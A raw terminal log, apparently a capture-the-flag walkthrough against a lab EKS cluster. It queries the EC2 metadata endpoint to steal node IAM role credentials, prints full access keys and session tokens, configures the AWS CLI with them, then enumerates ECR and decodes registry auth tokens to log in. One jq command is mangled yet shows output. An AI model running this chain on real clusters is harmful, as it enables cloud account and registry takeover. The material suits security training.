$ kubectl whoami
system:serviceaccount:challenge3:service-account-challenge3


$ kubectl auth can-i --list
warning: the list may be incomplete: webhook authorizer does not support user rule resolution
Resources                                       Non-Resource URLs                     Resource Names     Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []                 [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []                 [create]
pods                                            []                                    []                 [get list]
                                                [/.well-known/openid-configuration]   []                 [get]
                                                [/api/*]                              []                 [get]
                                                [/api]                                []                 [get]
                                                [/apis/*]                             []                 [get]
                                                [/apis]                               []                 [get]
                                                [/healthz]                            []                 [get]
                                                [/healthz]                            []                 [get]
                                                [/livez]                              []                 [get]
                                                [/livez]                              []                 [get]
                                                [/openapi/*]                          []                 [get]
                                                [/openapi]                            []                 [get]
                                                [/openid/v1/jwks]                     []                 [get]
                                                [/readyz]                             []                 [get]
                                                [/readyz]                             []                 [get]
                                                [/version/]                           []                 [get]
                                                [/version/]                           []                 [get]
                                                [/version]                            []                 [get]
                                                [/version]                            []                 [get]
podsecuritypolicies.policy                      []                                    [eks.privileged]   [use]


$ kubectl get pods -o yaml
apiVersion: v1
items:
- apiVersion: v1
  kind: Pod
  metadata:
    annotations:
      kubernetes.io/psp: eks.privileged
      pulumi.com/autonamed: "true"
    creationTimestamp: "2023-11-01T13:32:10Z"
    name: accounting-pod-876647f8
    namespace: challenge3
    resourceVersion: "12166911"
    uid: dd2256ae-26ca-4b94-a4bf-4ac1768a54e2
  spec:
    containers:
    - image: 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01
      imagePullPolicy: IfNotPresent
      name: accounting-container
      resources: {}
      terminationMessagePath: /dev/termination-log
      terminationMessagePolicy: File
      volumeMounts:
      - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
        name: kube-api-access-mmvjj
        readOnly: true
    dnsPolicy: ClusterFirst
    enableServiceLinks: true
    nodeName: ip-192-168-21-50.us-west-1.compute.internal
    preemptionPolicy: PreemptLowerPriority
    priority: 0
    restartPolicy: Always
    schedulerName: default-scheduler
    securityContext: {}
    serviceAccount: default
    serviceAccountName: default
    terminationGracePeriodSeconds: 30
    tolerations:
    - effect: NoExecute
      key: node.kubernetes.io/not-ready
      operator: Exists
      tolerationSeconds: 300
    - effect: NoExecute
      key: node.kubernetes.io/unreachable
      operator: Exists
      tolerationSeconds: 300
    volumes:
    - name: kube-api-access-mmvjj
      projected:
        defaultMode: 420
        sources:
        - serviceAccountToken:
            expirationSeconds: 3607
            path: token
        - configMap:
            items:
            - key: ca.crt
              path: ca.crt
            name: kube-root-ca.crt
        - downwardAPI:
            items:
            - fieldRef:
                apiVersion: v1
                fieldPath: metadata.namespace
              path: namespace
  status:
    conditions:
    - lastProbeTime: null
      lastTransitionTime: "2023-11-01T13:32:10Z"
      status: "True"
      type: Initialized
    - lastProbeTime: null
      lastTransitionTime: "2023-12-07T19:54:29Z"
      status: "True"
      type: Ready
    - lastProbeTime: null
      lastTransitionTime: "2023-12-07T19:54:29Z"
      status: "True"
      type: ContainersReady
    - lastProbeTime: null
      lastTransitionTime: "2023-11-01T13:32:10Z"
      status: "True"
      type: PodScheduled
    containerStatuses:
    - containerID: containerd://665178aaf28ddd6d73bf88958605be9851e03eed9c1e61f1a1176a69719191f2
      image: sha256:575a75bed1bdcf83fba40e82c30a7eec7bc758645830332a38cef238cd4cf0f3
      imageID: 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01
      lastState:
        terminated:
          containerID: containerd://c465d5104e6f4cac49da0b7495eb2f7c251770f8bf3ce4a1096cf5c704b9ebbe
          exitCode: 0
          finishedAt: "2023-12-07T19:54:28Z"
          reason: Completed
          startedAt: "2023-11-01T13:32:11Z"
      name: accounting-container
      ready: true
      restartCount: 1
      started: true
      state:
        running:
          startedAt: "2023-12-07T19:54:29Z"
    hostIP: 192.168.21.50
    phase: Running
    podIP: 192.168.5.251
    podIPs:
    - ip: 192.168.5.251
    qosClass: BestEffort
    startTime: "2023-11-01T13:32:10Z"
kind: List
metadata:
  resourceVersion: ""


$ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   523  100   523    0     0   1309      0 --:--:-- --:--:-- --:--:--  1310
{
  "AccessKeyId": "ASIA2AVYNEVMX6YN2JPR",
  "Expiration": "2023-12-14 13:23:57+00:00",
  "SecretAccessKey": "jWsH9O5yPq89aKM/k0ZZbpdhlbIj4RSW+hgAwzYv",
  "SessionToken": "FwoGZXIvYXdzEPb//////////wEaDBi4cYoGkOVAY62SmCK3AVzsshXczt99eH+7FLB3SRGzTKBIxfxoGV57lSuP/cf6XRIXNdbZrAf95xZBE+AdM8vPjo+dlAYnnspS2Ui7l2NomLykGeqvfkJDuZK/BEJ+FZrMviuW0QC6v8flyYBt6RM2pPaqd9J5Zq8tq5cfWgT8qqBm6mMnxrm5tJ6JCMpE3MA1S1oY1X5A6Zj8TmSFgWfX3iTRRBef6SM9P3Dnx+rWgw+wl5u6gWEaSDV7pPCxTKNTr+uMQyjd5+urBjItqXdXHjcDKRzBYPNherAxLYSMIJLiAhHwH8I8/zcK+sec9R9G45Fd+e77gB7U"
}


$ aws configure
AWS Access Key ID [None]: ASIA2AVYNEVMX6YN2JPR
AWS Secret Access Key [None]: jWsH9O5yPq89aKM/k0ZZbpdhlbIj4RSW+hgAwzYv
Default region name [None]: us-west-1
Default output format [None]: 


$ cat ~/.aws/config
[default]
region = us-west-1


$ cat ~/.aws/credentials
[default]
aws_access_key_id = ASIA2AVYNEVMX6YN2JPR
aws_secret_access_key = jWsH9O5yPq89aKM/k0ZZbpdhlbIj4RSW+hgAwzYv


$ echo "aws_session_token = FwoGZXIvYXdzEPb//////////wEaDBi4cYoGkOVAY62SmCK3AVzsshXczt99eH+7FLB3SRGzTKBIxfxoGV57lSuP/cf6XRIXNdbZrAf95xZBE+AdM8vPjo+dlAYnnspS2Ui7l2NomLykGeqvfkJDuZK/BEJ+FZrMviuW0QC6v8flyYBt6RM2pPaqd9J5Zq8tq5cfWgT8qqBm6mMnxrm5tJ6JCMpE3MA1S1oY1X5A6Zj8TmSFgWfX3iTRRBef6SM9P3Dnx+rWgw+wl5u6gWEaSDV7pPCxTKNTr+uMQyjd5+urBjItqXdXHjcDKRzBYPNherAxLYSMIJLiAhHwH8I8/zcK+sec9R9G45Fd+e77gB7U" >> ~/.aws/credentials 


$ cat ~/.aws/credentials
[default]
aws_access_key_id = ASIA2AVYNEVMX6YN2JPR
aws_secret_access_key = jWsH9O5yPq89aKM/k0ZZbpdhlbIj4RSW+hgAwzYv
aws_session_token = FwoGZXIvYXdzEPb//////////wEaDBi4cYoGkOVAY62SmCK3AVzsshXczt99eH+7FLB3SRGzTKBIxfxoGV57lSuP/cf6XRIXNdbZrAf95xZBE+AdM8vPjo+dlAYnnspS2Ui7l2NomLykGeqvfkJDuZK/BEJ+FZrMviuW0QC6v8flyYBt6RM2pPaqd9J5Zq8tq5cfWgT8qqBm6mMnxrm5tJ6JCMpE3MA1S1oY1X5A6Zj8TmSFgWfX3iTRRBef6SM9P3Dnx+rWgw+wl5u6gWEaSDV7pPCxTKNTr+uMQyjd5+urBjItqXdXHjcDKRzBYPNherAxLYSMIJLiAhHwH8I8/zcK+sec9R9G45Fd+e77gB7U


$ aws sts get-caller-identity
{
    "UserId": "AROA2AVYNEVMQ3Z5GHZHS:i-0cb922c6673973282",
    "Account": "688655246681",
    "Arn": "arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282"
}


$ aws ecr describe-repositories
{
    "repositories": [
        {
            "repositoryArn": "arn:aws:ecr:us-west-1:688655246681:repository/testos",
            "registryId": "688655246681",
            "repositoryName": "testos",
            "repositoryUri": "688655246681.dkr.ecr.us-west-1.amazonaws.com/testos",
            "createdAt": "2023-10-29T17:52:00+00:00",
            "imageTagMutability": "MUTABLE",
            "imageScanningConfiguration": {
                "scanOnPush": false
            },
            "encryptionConfiguration": {
                "encryptionType": "AES256"
            }
        },
        {
            "repositoryArn": "arn:aws:ecr:us-west-1:688655246681:repository/central_repo-aaf4a7c",
            "registryId": "688655246681",
            "repositoryName": "central_repo-aaf4a7c",
            "repositoryUri": "688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c",
            "createdAt": "2023-11-01T13:31:27+00:00",
            "imageTagMutability": "MUTABLE",
            "imageScanningConfiguration": {
                "scanOnPush": false
            },
            "encryptionConfiguration": {
                "encryptionType": "AES256"
            }
        }
    ]
}


$ aws ecr get-authorization-token
{
    "authorizationData": [
        {
            "authorizationToken": "QVdTOmV5SndZWGxzYjJGa0lqb2lkRWxyWVZWRVZTOUdUakpoV201elprUndaMllyTTJaM2N6SkVObmRWUTJGUGRIaFhNazk2U2tSdldsTnpSa2x2TUhsRmRUTkVlVTF2Y1RaM2JERm1hemxvZW1nNFoxVmpja1ZuUzNsWlFVcFVRamxpYlRSM2VsRnlWalpZZGpjM1NYVTBNa1JpVVU0MGNGZGtlRTB4ZW5Wa1REWmlaRzVoZDFCTE5GbEpiRGRuYkV0WE9TdExZbWxwTVRVck5tNDFSVUp1UzBaTk15OXVaazFUZEN0eE1HWnFabVpQT1hZemFrRnNiMGxYUjFBMlJEWTJaVzF6Ym5GRGFFWklUWE01VGtsMmRrZ3hTRUptVHk5cGJtTnlMM0ZzU3l0TVYwNW9iMDV2TlRJdlZVZElMMDlLSzNFeGExUXZjV2xXWmtkRE0wTklVV3AyYjBKUFpEVk9TamR1ZUc5SmJXRnhkVU5RVFRKdFRTdG9UMEpOTDBaeVUzWlJZakJQTUM4eGRIUkxValIxVlRCMmVHMXNTUzgyY2tWRGNrWm1iR2Q2Tm5ZdlkweGlhMWRRTURsRFFUUndSMjlYVkVob1ZqWllaMEZFV0dKM01rTkJWMGxoZW1GaFpHWmhObU5PVGswek5sSmxSMkZMYUhSamMzUTFOM2xYWldsbFpXaDJibm95UTFaelowZ3pVbVIzWmtsR2FVWkJUbXBaWXpSU1lYTmljRXBFVEhBd04wSjFRMVpMSzB0RFUyZDViSEpKYVhKaFRIcGFRbGxtU1doTkswaDBRbWxSYzNSYU1FSmpjR2cyZVdwT1NYUkJOMnRZWlZWVU0ybzRhMjA0VEdGalQyeDRlUzkxT1habVUxQTNVR2QxYTFSd1ZVMWpkMFZTVWpneU9UaGtiU3MwZURBdmJGbHJTREl4TVdVMk1tMUxWM1ZOVVdaUVVHYzRhbHBVZDBoUE9TOWljVE5sT0doS2VIUkxiRVZYVjJOb1YwbE1aemRFY1dSV1REWkNSaTh3WW1KQlprbG1PVXhaUWxJMFRtTXhSbk5OUzBGcFFtd3pSQ3RqTm1Sa1ozWndPVWhYZDBWSVdVNUdXV0ZTTjJoV2NYVkZMM2xxVmtSbWFGSnlORkZWTlUxa1NIRlNlVk1yVmxsMmFTdHdUR3BHZGxac1VrOURhelIyVEhabVpHMUNZMWxtV0cxd1V6bEJLeTh5WjJsSGNGWm9MMUJTVldzeWNVbFdaa05xVXpNeVN6Y3JObE5uYTI5UEx6WlFjM1psYVVoS01WZzRTM1ZVUTNKTWRUWXJORmhyU1dvek0zZEZaVmxOYWtsVFpXTmhNRWMzTkRBNWFuSmFaRVF4VkZFM1REZEpZMWN2WmpKWWNTODBLMHhIV0VrNFMwTkRVSGs0Y0c1bmVIUkxZbHBzTlhWQmJFUlhXbVU1WlRKcVlXSkVWMDB2ZG1OdlJsUmxhRWRMU0hnMGFHTk9lRlJLV2psRFVYRmphbkYzYWtkaFREbDNUVU41WjFsM1lpODFiVmwxVUc0clVsaGFkVVJYV2xSUmRtMHdlRkZwVjFwNGRHcElOVk5DZGtKRGVuRXhNSFJ4YVV0WFpFcDRWVVIxU1RkdFRtdE9XSGx1ZVRkMlNscEZNRVZIYm1ad1FWZGlha2RSYmxwRkwzVmtTSHB5VVhNMEwyWmhhekJ0VkVKblVUSk1hWEZQWjI5aFJ6QkNaMk01UkV0R1dVOTFaMms0UjBaeVFuSnVkWGhFU3preFVWTlRVVkkwVW1OWmNVMDBLeTkwZFZGVWNXZDNWMUJ3WjNGQlZIUXJNbUoyZVRaU1JFOVZSRkpFVkVkV1IxUlBTVmw0WlRsWVdYcHBhWFZWWkd0MVZtbEZkMUFyZWtOWWMyUlBiRkV3YTNOdmVGSjFSbTB4TlRaQmVqTTFkR1JoWTNwWk16ZDJMMXB0ZGpkV1VTOXhZMVk1YVZNMksyVjBNRFpIYlZwNmEzRldURTlVY0U1TWFVdFROMEZTYWtKQ04wUTVOR1l5TlM5SFJVeHpNRGhuV1V0VVptSktWVVEzVDFsNlR6bGthVlJLS3pSb1NVMDNVMjlMYUcwMVdXOTNSVEJqYUdoV2QxWlRkMjVwS3pGV09FcDRjRkpoTTNOUE9XbEZZMVFyZW5CS1RtVnlTMk5zWkN0MGEyNHpUamxEY3poRWNtUjFlRkp1TlVoaloydzVWRGRYVjFkbVVERmFSRTQ0YVcweWRrTlRLMHgxYzBGdlNUVTFObE5sUVdvNU4yRkVNa3RYS3pObVkwOUJSM0Y1YkdGd1RHWmFjQ3RCUlZKcFZDdEhWV3d3VkhRNE0zSlljRTlOTTJzOUlpd2laR0YwWVd0bGVTSTZJa0ZSUlVKQlNHbHFSVVpZUjNkR01XTnBjRlpQWVdOSE9IRlNiVXB2VmtKUVlYazRURlZWZGxVNFVrTldWakJZYjBoM1FVRkJTRFIzWmtGWlNrdHZXa2xvZG1OT1FWRmpSMjlIT0hkaVVVbENRVVJDYjBKbmEzRm9hMmxIT1hjd1FrSjNSWGRJWjFsS1dVbGFTVUZYVlVSQ1FVVjFUVUpGUlVSRlEwaEhSRTkwY1RoSWQzUnhhMnBsWjBsQ1JVbEJOek5yT0ZRMWEyUlFXRlkzYlZaSGNUaElNbVYxYkc5NE5FSm9WSHB3ZVRCYVNFWldNR1YyVDNReVJYTnBjazlXUXpWaVoxSTBSMjlsUkhsNVkzTldUamRRZWxBeWRGcDNUVVJLVkVsaWRXczlJaXdpZG1WeWMybHZiaUk2SWpJaUxDSjBlWEJsSWpvaVJFRlVRVjlMUlZraUxDSmxlSEJwY21GMGFXOXVJam94TnpBeU5qQXdNVGc1ZlE9PQ==",
            "expiresAt": "2023-12-15T00:29:49.328000+00:00",
            "proxyEndpoint": "https://688655246681.dkr.ecr.us-west-1.amazonaws.com"
        }
    ]
}


$ aws ecr get-authorization-token | jq -r '.authorizationData[].authorizationToken' | base64 -d
AWS:eyJwYXlsb2FkIjoiRWdqUXBRNkx0QTZkdlZRN0ltMi9aa0pkRlBEZ3NLcEkrUXpaUDhaa3d3aGFGUDFIR2FrNnRNUHQ4K0pmemVsczlnSXVPVkc4cHY2MFpURkswby9DQ3loeEVrY3lScEIrR2FhNDAvc0tybmhyUHFmaEFpaGVGUlJ6b2xGNDRpZ2VkdHlwZkJidk1sTCtGTU0wQUhsbWdvVFQxZkFZZWRLWlI1UnV0Q1I0ZUs1cDl3ekNVOGtVT2djUWRWNXFqbVAzM21wM3R1K0lwUW94ZklhbEpKa005UGRzRzBsYjA3WXBjbDh6bndyUjluSGtsU2p2elRSaGNkeWthRm5vdmdTUDZTZ0FndW5xTEJtd1ZrUWRTcjV4N01Md1owNGZ3SnFCbldLNE9iSWYvNmlDSzdkb1plMDIzSXBxNnJKMnA3RW1LWEpQTjZyU1hSbUpBMk12VzhPMHlEVUpWNGJaZXBiaGRVVm9qaHBDdWlmQmtmcDkzbkViTG1waDZlSkxZR01jWllMTDc0Q0JIMWhtMlpmNDFoS1UyVUg4Q1lDZHR4RFRzSnVQT3NGVERXVWhmQ0JmMkpzL2dEMCthV3BOVWxMcmtpNW1tR2dKVERsOCtJRnlub0pyQ0V1S0Z3a2ZkS0swbWFlWGE3b3FOSkhsMWhQU1JkeE9ybUVkQllsTDJBMG1qaHVWcDBpV2tNS3l6cnZ6alZjMmV3dHVHMkdWVU8yNXZqVW5DNUs3NytLNjFQL0RROUFQd1F0RVhVdG40YmpJZVJlUkd2ZjBYSk5RbUhQSHR0Y2YxUnNVZkd4STZiVDR1bEp4V1BBTGVHUi9tWXk2cmp2UTBXVTlFcXFaYlBxcmxqNWJwSXBiNFdjZEJSRkg1MFQyVnpjbDViQk9GMGI0OGVmOFBRTGg1cmVaalZNSHZYYWd3WnRQbi9aNHI2aktyWjlxODJXbTZYMTVzdy9rK1ZmUHBDZGdXUmlWTWg0ZjJ2aEpLakRFdWRBL0VMZ0YwSFpFSWp5cnFnRGpUd085dElpMGd5YnA5b3dVSDk0MEJLQjFVMlNmTWRTSEl3KzNzcVYxNlgrcXJHSkZHRnFMbmw1NWRUMUoyUWlZS1NnL3prMDR6SnU1bUZnNnJLWXVXbE1aSjhFSDU0YmUzTGVRckQ1NEVwcVd2a05jTHNoTHhWcUR3SEdXWWZiL0VxYUxnYWZGS2p4bXQzN3FLdldWOW8vdTYxUkJqTlZiY0RYNTNXbms4eTBQbDQrNHZxREtOYXIyRVFiYzJGckVObkNoTkw3YXdlTEZmVlFWMytLMFcvOHoxSmZPK2ZRWG9CUUI2UXc5OW1HNE1hU1h2MDYrRHdhMTFmTnZ4UjVOYjNKM0lxc3lQT1RJSm9HTjFaRXpSQzlyRllEeWowSmprN1VkcXgzSmNvajg2d1VKVjY5eGo2ZWh1cjZmRmlUamNNY3pHS0dkSUtEVkFWdjc3VVZsKy9DaFd5QVFFV1JJMS9xT1Z5M2VwM0U1RFAwSmtxem1PSzFrbzdkRW9lcnFhYktSazkvN0poWGtOdVpIU2d2WWMzWVlCSDZ3d2JHa2JoeFkvNVVzQVU4WnRDYi9yN2JqbmY1U2F4VFR5VUo5NUlyZnFoZUFrdWYxM0o3M1d2dHJia3MvQTI5QzU1Mi9KT1M3dHdpa2x3c0FiNCtGcGtNWkNnSWgrbWh3VUhLYzMwYkxPTzN4UkJZSTVqS2pEMW1kajJkUUR3b29URUtSb01DY0Rxb1ZleDA9IiwiZGF0YWtleSI6IkFRRUJBSGlqRUZYR3dGMWNpcFZPYWNHOHFSbUpvVkJQYXk4TFVVdlU4UkNWVjBYb0h3QUFBSDR3ZkFZSktvWklodmNOQVFjR29HOHdiUUlCQURCb0Jna3Foa2lHOXcwQkJ3RXdIZ1lKWUlaSUFXVURCQUV1TUJFRURJNStvRG8xd3QwVG1GK1pPZ0lCRUlBN3dTOUJZM2RHanhqalIzcXorNmVqMTV4NFMzRFlVUXh6ZkJXeFAwRFc4VGZIK2xlRko0ZVZEMk4wRWtFaEplQUpFMHJBSXF5NENwVXhtMU09IiwidmVyc2lvbiI6IjIiLCJ0eXBlIjoiREFUQV9LRVkiLCJleHBpcmF0aW9uIjoxNzAyNjAwMjA5fQ==


$ aws ecr get-authorization-token | jq -r '.authorizationData[].auken' | base64 -d | cut -d ':' -f 2 | base64 -d | jq
{
  "payload": "l8nPhgelNjBIQV5HzJmBhx7upszLdUUE2U2lEmJuBJwQU5tRqOjSriCCN/HHZc7Y+yHAgdJoW19WAI/C1U/7PoVf4AjPHWeF5zZx+PXJiI3OnwsRTwgbhe44hnPCxW7WwIa7d8NjOixTLn67shUhXH890f2vu3FHZyX2ou8M0E1uqc2fA/W8+jbZ8JPJZduvtE/WgoPPsZ5omD2p35dq8G3m8xcyMHjfY6ZmYQA8wBThCVlqsdkhWm/0QpQDrtqm9kndqtux7IEMVeK45sGLmkovg3zE5vAxRUJZGSp1CAFgptWn1gkP491P5gJ+mtvEcbA0p2gFo1N1eJIWfPVWNVjNb8/nUtv9VU8w2MqH7lvOl2h5LEASwPdL2FhjCvs+FaeO1ipj3J42bi9Yj+wkr6oMvU9VjPbvLHxrRS8MDwWSB/eGYhmPCYFwJpr4TaDO/d4DPApbGP+xutkgz+Xlv8JM4O3MdKXy1/QkYHP8Jq+rjzhxUKFiUUz5meM8nPA50X/mChXAYcam5jeK+1TNT+CpBRvZDtvcTmlR1gddREz3zAiPOwEhNQSBoCDXSGavGWdGjxs1J+gIgb+0+Zh9wDOq2OYWXAkBw8kwQ4YLEfS78yqrPAs9CQi2xDvZ5uk1KjMS8g3tWotQkChl0UstnoVMvoszzFgxFfZux+DvvGfMXiYLdUD+FpM/RtNecFZPT81Lvg0oJKBvdMLXfSxdVEoYlOrb/x8/NZgURs7Gd3JOLMUoWQlhvY8uSntMiIybfmVCDsVSb3KBKwMilwdBYkl5sHdpLsVx56jdw9kwQID5KHDwYqgUobemLOYqzhhMLdilypj2EI5uogZuxbj+OtfRljSFboXfUB3GK/8EcuQf5niLHJp5v2IUIB+nmWMIAXiQfGlnTCIwRykNaLoOlTvVH/5/xNBOlJ4U9JoXlcIEa5+nKAzM1S88wN6C/f967b8X4LWFVkD4QvzWO0X+/ikGNxekULG3j8JMamCsyAyrE/UBRwSSFxG+qf6uomTxpe4r5ViAllFs03EcQWTFz3sYdR4fvG17ir/h9XoAs8h14jPZuT8KhfUjecVjoP8iOW0P2KIqcn1wETvJqm8R9gXJsm6MxpDYov2/n4iJQEuygu1xRkkbCCbrPSnIstLecAq/2CSJhDK7u+HvnE1AJHhrKpIurPx7pns6NLlDrEdsw4tRd69MdYsYzFZHoeLGNBgtZkvS3meqT+p9UECpfw1L389lfxSXSgzp5m5IX0fF078RFEAPrdAaI9PfTJn3BWg+QtFi9q+qXRtEhi6XRTEEUYyF7EfdkOx8u50=",
  "datakey": "AQEBAHijEFXGwF1cipVOacG8qRmJoVBPay8LUUvU8RCVV0XoHwAAAH4wfAYJKoZIhvcNAQcGoG8wbQIBADBoBgkqhkiG9w0BBwEwHgYJYIZIAWUDBAEuMBEEDO6tZWeR//A/yDlvuQIBEIA77S3P+1zcOZu1aXpf6RGk3mN7PJDo2lCGizz/J4jY4MWd6hrug/H3e9XS+GS05LYraLKQ4wv+r9pi3TE=",
  "version": "2",
  "type": "DATA_KEY",
  "expiration": 1702600235
}


$ aws ecr get-login-password
eyJwYXlsb2FkIjoibk5CK1NyZEU4OGp2U2ZUamNNbHA2bDIvMmg2Z2ZXenFFMUJpYzlWSkpBWk1LZWhFQThDcXNFZ0JHTFNWbENjT21US0JJcXpXbERwVVJtV3RoNDAzWGpHbmQ3aWIzRStTLzBIODVVaWE2cXljdnF3NHE5blBDenZaQkZPT1draERRd01RejBjWlljK3BkZGNJLzVoWnVnUkxFTjVtM0pKNDhDcEh5WWNiRG1ZWXFlcXUxN0IybHBVbDVUNHdYL0F4SmF6cjRveUJtTFdBSWh2eG5NTDdJSFJuWGxLdXY2eU9rRFVmbjhmYktCQWNSNUZuUlorcmpDTFZNTU80ckVKRVdsMkU5cDBENGVzTkR0YndURlhjYjVVM0pxNUFmL2kzWWRUbC9naVZIK3M2Z2xaeFNSanI0OVlYYUZpWUQ3Z1pVZnRpUDR4Q212bGwwZEMxeW9sZ25mQmVTQ1l2dk5RMGpVNDMzODhDcjhBZGFIc1o3RWU0OTZlL3FkRDFaZ1QyMUtwMkJJZUdSTHNwbzR0U1RYYTBpVmNkWmxyckZPNzFtaWlTTTQ1TlJyTlFHQUxHVVdpYVFvVTBndGRoK2s5SDV5U3lOWGpVZndoMk0vYzZoVk8rUUdYaXcrVER3N2lZeUZueHJxemlEQ0w5MkI0TVZiTkVZbzdJY1RhbnZybXdwZU9SUkRhT09LdlBRaGxrUXFQK3hqWFNzaFp3WHJEZzBCZnVjVWc4Y3lIL1B0K0pqTTk4NUpmK3NXOHluYVZNQlZBd2dXa1NIajMrc2h6TS9XS0c0dFlNU2tEeEVpaW5pTDVnOHpJVC9vQllXcnl0ZWI4dUhvZG1ieVVtWmQrcnd2UFc0RlA5eU1xT2QzeVZWSk8wZHpEQzBha0JHRU9PZlpyTUkxTzI4SWFISy8zdFg1eUJVV3V5eml5OEFiSytQRVk5eGI3T3ZxZW9mZy9KSWwrU2pxZlQwZG5aclVndmhHb0QwTVRkMVRaYUlQLzlOSWdGR01WcXcyTDJGTURud1V0Y2tKT2RyVllOUmpSdmpxY3JvOUlaQXNjRDllTFZBMWFFQ0hwZEJCNzQrTGQ5TDVYU3dJMDEyMlIrcXpJZm5lVGw5bzB2MVBLcDZQY3JsRDA2STlpbTRwYkc3R2NDdmY1TUdRR2Y1STk1TnA4UHVyL3IzcUxSUlhhbGR3Z1ZFa3U3SmdtM2ZBRVZlYnNDVmd2NXhmeVNnOFc3WG1vWnpudFFGM2k1WC9oK1UxanNTR3FRbEdpZ0t0SllMQzlRNWtUT1dZQ2t4czNJc1hUUFV1N3M1Sks0NUljeTB0dE1aTDVQRXJVUmg0MmJ0Y0ltcUJENWJiQVRrVmMvZ20wSTV1TmUxMFdXUmUzOFI3RHFUSjZ3Zzc0WjJKS3kxekFCQjdqaGNtMGNES3psL0J2RG9oN3NmSkd2aXRZY0ZxN3hUY3NOQjR0VDcxKzZmRWtNY0l3RU4rWEQxanpldS9ibmVOaXRmVW1ES2ttYk40SytKK2NtTUczMExrbmp4N2dFT0Z2RXVmZHNlV2VTWG0wKzJRR1Bud091V1Y3ZHg0VDRVUzhxd2ZobExzcmtVUHJDaEE4NnpETWFqWEttSk9sN3RoRzBwU3gxR1AvelVSYmtSZ3d3QnUwUmxIbi80VEVhM2l4VFZVTnB4bUc2NDIxbXY3eUhleGRCSWsySjZ1R3JJMVVtSEdVa0EwenBKYmN6OHp5QU41MmtLVjJTbGwxTGRDSVhtVkk9IiwiZGF0YWtleSI6IkFRRUJBSGlqRUZYR3dGMWNpcFZPYWNHOHFSbUpvVkJQYXk4TFVVdlU4UkNWVjBYb0h3QUFBSDR3ZkFZSktvWklodmNOQVFjR29HOHdiUUlCQURCb0Jna3Foa2lHOXcwQkJ3RXdIZ1lKWUlaSUFXVURCQUV1TUJFRURFdFozWitHajJYKytEcXk3QUlCRUlBN2gvOG9mRDlwcENWeUo0ZzljUERacGNwcm9wQ3pPRkV5WXJnZXhvVHRQYS9UbHVldnVlanJiZU5DelpYYTRnZ0FPUU8zd2FCM3IvR0NHc289IiwidmVyc2lvbiI6IjIiLCJ0eXBlIjoiREFUQV9LRVkiLCJleHBpcmF0aW9uIjoxNzAyNjAwMjU0fQ==



$ aws ecr get-login-password | base64 -d |jq
{
  "payload": "kfpDdUQgCSbw4PMcaDCwZPYmKzWxEWlUT1oSqvYj7yfTZV/hOevpIhKc3y7KERNyx98eCJ+4uVp7lEbLary+pDf6ahpmWjMJlxAqzK6yWXDEYG5bFZF1QIE/YGYOyQH2rTr1go6nXyTU+xoXqPydtr3xymx4tEZ9ukWPXZ5LKTcE1XEqlCmoYLLEc/fDHbty7Qr4VQ/IB9ELw0l4YC+iv9PTCHf8/RSVnJ52oQw0Go6/oF5RGpsMQZUvWPFWNC9qJtqBWx+SGeYaTW67pLYkyOz2/pgYDC8W863jV6K378qJj04muXFsd77oraC660a0+mYbQXt7YbyS8zC7nmA7560P3xf6bkzPM9TKXY869xGu72KRCzOt75i0LnQ8OPYVKgYPdSte8OKPamV/wfiBVTQ8wsDe54b4Bd799Ef7wNlDsX6Uo71G4Q967+PXHdHuW0r3aJaTv+1v7aJkKP3pov46/ECtpNmDzb5u6kpOrhwC+SAU2edUCSsrakabqbc0yBmwCxwJ9htMGBCN9VauylUgexkKQh2/PiXDEj8nki3tVbov13Sy5gk0VIf19OegrfL7aHqFWRpZRjuPQ/hD2u1XP2nfC1gZPXVpfzCQzgKhJR1ZSvGFveh8Sb+jXUXs2N+2FkD45Fs+FPHETq3Kgp6GdVPQ0GY1uKCXyAw5uBQmwWmi8dPSWNHsmDzYGFykBaCkv3q0CUhcoI2VDl4hI1JttMkaulWa5CTKASWsl53vRLaTNzwnLRZ4HE+pfifORJ73miPULh/ZkPOzJXAl1SjYAnUs/vI+LrJE8gl6X5orF4QTtGXK+WxAu9NSNptIJFuvJDFFI7xqXieHXYrA1la48V3NOVEEinv+g3MEosodSdXzNkOk52WRaG/8AmpVSbLoEB56Y/xahi+W/PGxNEljfnyb3yB7TxgXfwJwQhzhXQAnJkNHrIYkDJPGv0+J2vVipZvcgi04Jsj5JCfrKLFYoselAvbGe6ttOLDoYOGuXs0K6MPerAJgwvOBeJlQteMTj3RC5NwYMu/oMwAYWQyaZOLQrKnVl+XkkB9m4gN/2V/cWXGoC9CP9IFK4J2Qi6h6sW2NYesFHOhffhVVII/VjeVfYuTOxk/LHic8uQqJ/R5oDMaY6jpPVrgu2ZQkraCrtY4tZ9bfUNKzSgKjDxbq8HEtvHrWbqiW0W/Uc3inOQHiZoimUf+l3Y34ljKNa4vT6WHS0QohcGIbjcRoVtzoRuIE/H1+7DlXXelXEd2NI59sKYV8yxmidA5DXdKK5ho9OERXlgP2K5CBNxqE4y0oWCDhVwaGQZq6RfE=",
  "datakey": "AQEBAHijEFXGwF1cipVOacG8qRmJoVBPay8LUUvU8RCVV0XoHwAAAH4wfAYJKoZIhvcNAQcGoG8wbQIBADBoBgkqhkiG9w0BBwEwHgYJYIZIAWUDBAEuMBEEDLpW+F4AWF4eLEpVQQIBEIA7J5xv9qTwmMN4jo0m2aYvYt02V3DfEJKY9vz2/8KzVrdpGcFm8sWIqgTvR2r/gnGBMpH5y1vbo3DNVMc=",
  "version": "2",
  "type": "DATA_KEY",
  "expiration": 1702600263
}


$ aws ecr get-login-password --region us-west-1 | crane auth login --username AWS --password-stdin 688655246681.dkr.ecr.us-west-1.amazonaws.com
2023/12/14 12:31:32 logged in via /home/user/.docker/config.json



